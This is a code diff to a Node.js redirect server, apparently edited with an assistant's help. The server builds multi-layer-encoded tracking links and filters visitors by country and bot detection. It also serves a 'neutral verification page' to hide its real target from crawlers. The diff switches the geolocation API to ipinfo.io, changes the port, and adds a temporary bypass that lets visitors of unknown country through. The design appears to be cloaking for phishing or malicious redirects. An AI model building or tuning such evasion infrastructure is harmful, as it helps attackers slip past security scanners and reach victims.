@@ -25,10 +25,10 @@ const BOT_URLS = [
 
 const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
 const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
-const GEO_API_URL = process.env.GEO_API_URL || 'https://ipapi.co/{ip}/country/';
+const GEO_API_URL = process.env.GEO_API_URL || 'https://ipinfo.io/{ip}/country'; // Switched to ipinfo.io
 
 const LOG_FILE = 'clicks.log';
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000; // Changed to Render default
 
 // ────────────────────────────────────────────────
 // CSP – strict, no external resources
@@ -153,7 +153,6 @@ async function getCountryCode(req) {
 
 // ────────────────────────────────────────────────
 // MULTI-LAYER URL ENCODING / DECODING
-// (unchanged from your original)
 // ────────────────────────────────────────────────
 const encoders = [
   { name: 'base64',     enc: s => Buffer.from(s).toString('base64'),     dec: s => Buffer.from(s, 'base64').toString() },
@@ -204,8 +203,7 @@ function multiLayerDecode(encoded, layers, noise) {
 }
 
 // ────────────────────────────────────────────────
-// GENERATE TRACKING LINK
-// (unchanged)
+ // GENERATE TRACKING LINK
 // ────────────────────────────────────────────────
 app.get('/generate', (req, res) => {
   const target = req.query.target || TARGET_URL;
@@ -248,6 +246,12 @@ app.get('/r/*', strictLimiter, async (req, res) => {
   if (ALLOWED_COUNTRIES.length) geoAllowed = ALLOWED_COUNTRIES.includes(country);
   if (BLOCKED_COUNTRIES.includes(country)) geoAllowed = false;
 
+  // TEMP BYPASS - REMOVE AFTER ipinfo.io WORKS
+  if (country === 'XX') {
+    console.log('[TEMP] Forcing geo allow - lookup fallback');
+    geoAllowed = true;
+  }
+
   console.log(`[DEBUG-GEO-CHECK] Country=${country} | Allowed=${geoAllowed} | Bot=${isLikelyBot(req)}`);
 
   if (!geoAllowed || isLikelyBot(req)) {
@@ -288,7 +292,6 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 
   // ────────────────────────────────────────────────
   // NEUTRAL VERIFICATION PAGE + AGGRESSIVE CLIENT-SIDE BOT DETECTION
-  // (unchanged from your original)
   // ────────────────────────────────────────────────
   res.send(`
 <!DOCTYPE html>
